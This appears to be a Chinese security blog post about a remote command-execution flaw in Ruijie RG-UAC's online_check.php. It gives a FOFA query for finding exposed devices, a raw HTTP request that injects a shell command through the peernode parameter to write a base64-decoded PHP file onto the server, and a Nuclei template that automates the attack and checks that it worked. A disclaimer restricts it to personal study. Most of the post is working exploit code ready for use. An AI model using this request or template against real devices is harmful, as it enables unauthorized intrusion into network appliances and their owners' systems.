#  锐捷Ruijie-UAC online_check.php存在RCE   
joyboy  fly的渗透学习笔记   2024-03-09 17:34  
  
**一、免责声明：**  
  
****  
      本次文章仅限个人学习使用，如有非法用途均与作者无关，且行且珍惜；由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除整改并向您致以歉意。谢谢！  
  
  
**二、产品介绍：**  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/iaqVyfOadia6roCcjlf8Xv2Kzia1OYkLJvef89Qibs7TONz3zybTZ6uNKo2fGzzh8xj4dnLDBNYD6H9OOcRlWAoM7A/640?wx_fmt=png&from=appmsg "")  
  
**三、资产梳理：**  
  
****  
fofa：title="RG-UAC登录页面"  
  
**四、漏洞复现：**  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/iaqVyfOadia6roCcjlf8Xv2Kzia1OYkLJveO1icTPG9Mko6pib3ub79V32eCXLeNDvBm9c1EyBNBtJmv3xWLpzpTqOg/640?wx_fmt=png&from=appmsg "")  
```
GET /view/vpn/autovpn/online_check.php?peernode=%20|%20`echo%20PD9waHAgcGhwaW5mbygpOw==%20|%20base64%20-d%20%3E%20t1.php` HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


```  
  
文件地址：http://target/view/vpn/autovpn/t1.php  
  
**Nuclei模板:**  
```
id: ruijie_rce

info:
  name: ruijie_rce
  author: joyboy
  severity: high
  description: |
    锐捷Ruijie-UAC online_check.php远程RCE漏洞
  metadata:
    max-request: 1
    verified: true
    fofa-query: title="RG-UAC登录页面"
  tags: rce

http:
  - raw:
      - |-
        GET /view/vpn/autovpn/online_check.php?peernode=%20|%20`echo%20PD9waHAgcGhwaW5mbygpOw==%20|%20base64%20-d%20%3E%20ttt.php` HTTP/1.1
        Host: {{Hostname}}
        
      - |+
        GET /view/vpn/autovpn/ttt.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - 'PHP Version'

      - type: status
        status:
          - 200

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaqVyfOadia6roCcjlf8Xv2Kzia1OYkLJveKjEzEzGwnHQHGDyiawF9maiaMe9haa971C4IEe0CXEpaunOBLtlMc4gA/640?wx_fmt=png&from=appmsg "")  
  
  
